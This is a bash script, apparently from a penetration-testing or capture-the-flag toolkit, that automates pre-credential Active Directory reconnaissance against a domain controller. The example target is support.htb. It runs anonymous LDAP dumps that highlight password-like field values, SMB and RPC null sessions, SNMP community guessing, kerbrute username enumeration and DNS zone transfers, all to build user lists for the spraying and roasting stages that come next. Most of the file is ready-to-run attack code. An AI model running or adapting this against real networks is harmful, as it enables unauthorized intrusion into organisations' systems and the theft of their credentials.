#!/usr/bin/env bash
# =============================================================================
#  02_enum_nocreds.sh  —  pre-credential enumeration  (COMPOSITE, pauses)
# =============================================================================
#  Attack-chain role: squeeze everything out of the target BEFORE you have any
#  credentials — null/guest sessions, RPC, SNMP, Kerberos user enumeration, and
#  DNS. The goal is a username list and any anonymous info leak that feeds the
#  roasting / spraying scripts next.
#
#  Composite: pauses before each sub-step (y=run, n=skip, q=quit).
#
#  Extra flags (after the shared ones):
#    -U, --userlist <file>   wordlist for kerbrute (default: seclists shortlist)
#  Needs a domain for kerbrute + DNS steps — pass -d <domain> if not yet known.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
02_enum_nocreds.sh — pre-credential enumeration (COMPOSITE, pauses y/n/q)

USAGE:   ./02_enum_nocreds.sh [-t target] [-d domain] [-U userlist] [-q]
EXAMPLE: ./02_enum_nocreds.sh -d support.htb

FLAGS:
  -U, --userlist <file>  wordlist for kerbrute userenum (default seclists shortlist)
  -t, --target <ip>      target DC (default: scope.txt)
  -d, --domain <domain>  AD domain (default: domain.env; prompted if needed)
  -q, --quiet            no live screen output
  -h, --help             this help
  (shared flags: --help-common)

SUB-STEPS (each pauses): anonymous LDAP attribute harvest (description/info/
  comment, with password-shaped values highlighted) · SMB null/guest + shares ·
  RPC null session · SNMP (only if 161 recorded open) · kerbrute userenum · DNS
  AXFR + SRV.
PREREQS: a target; a domain for the LDAP/kerbrute/DNS steps (domain.env or -d).
EOF
}

USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -U|--userlist) USERLIST="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <target>"
DOMAIN="$(resolve_domain)"

log_begin
log_info "target=${TARGET} domain=${DOMAIN:-<unknown, pass -d>}"

# --- 0. Anonymous LDAP attribute harvest (cheap; many DCs allow it) -------
# Pull sAMAccountName/description/info/comment with an anonymous bind (-x, no -D)
# and highlight any password-shaped value — a stashed cred (e.g. the support.htb
# "info" field) is easy to miss in the raw dump otherwise.
if pause_step "Anonymous LDAP attribute harvest (ldapsearch -x, description/info/comment)"; then
  need_cmd ldapsearch
  dom="$(ensure_domain)"                 # prompts once if no domain is known yet
  if [[ -z "$BASE_DN" ]]; then
    log_warn "no domain/BASE_DN — skipping LDAP harvest"
  else
    run_cmd "ldapsearch -x -H ldap://${DC} -b '${BASE_DN}' '(objectClass=user)' sAMAccountName description info comment userPrincipalName"
    flag_ldap_secrets "$LAST_RAW_FILE"
  fi
fi

# --- 1. SMB null / guest session + share listing --------------------------
if pause_step "SMB null/guest session + share listing (netexec, smbclient)"; then
  need_cmd netexec; need_cmd smbclient
  run_cmd "netexec smb ${TARGET} -u '' -p '' --shares"
  run_cmd "netexec smb ${TARGET} -u 'guest' -p '' --shares"
  run_cmd "smbclient -L //${TARGET}/ -N"
fi

# --- 2. RPC null-session enumeration (rpcclient) --------------------------
if pause_step "RPC null-session enum (users/groups/domain info via rpcclient)"; then
  need_cmd rpcclient
  run_cmd "rpcclient -U '' -N ${TARGET} -c 'srvinfo;querydominfo;enumdomusers;enumdomgroups;getdompwinfo'"
fi

# --- 3. SNMP enum — ONLY if recon saw UDP/TCP 161 open --------------------
if port_seen_open 161; then
  if pause_step "SNMP enum (onesixtyone + snmp-check) — 161 was seen open"; then
    need_cmd onesixtyone; need_cmd snmp-check
    run_cmd "onesixtyone ${TARGET} public"
    run_cmd "snmp-check -c public ${TARGET}"
  fi
else
  log_info "skipping SNMP: port 161 not recorded open in recon state ($(ports_file))"
fi

# --- 4. Kerbrute username enumeration -------------------------------------
if [[ -z "$DOMAIN" ]]; then
  log_warn "skipping kerbrute: no domain known (re-run with -d <domain>)"
elif pause_step "Kerbrute username enumeration (-d ${DOMAIN}, list ${USERLIST})"; then
  need_cmd kerbrute
  [[ -f "$USERLIST" ]] || log_warn "userlist not found: ${USERLIST}"
  run_cmd "kerbrute userenum --dc ${TARGET} -d ${DOMAIN} '${USERLIST}' -o '${RUN_DIR}/kerbrute.out'"
  log_info "valid users (if any) saved to ${RUN_DIR}/kerbrute.out"
fi

# --- 5. DNS zone transfer + SRV record check ------------------------------
if [[ -z "$DOMAIN" ]]; then
  log_warn "skipping DNS checks: no domain known (re-run with -d <domain>)"
elif pause_step "DNS zone transfer + SRV records (dig @${TARGET} ${DOMAIN})"; then
  need_cmd dig
  run_cmd "dig AXFR @${TARGET} ${DOMAIN} +time=5 +tries=1"
  run_cmd "dig SRV _ldap._tcp.dc._msdcs.${DOMAIN} @${TARGET} +short"
  run_cmd "dig SRV _kerberos._tcp.${DOMAIN} @${TARGET} +short"
fi

log_end "success"
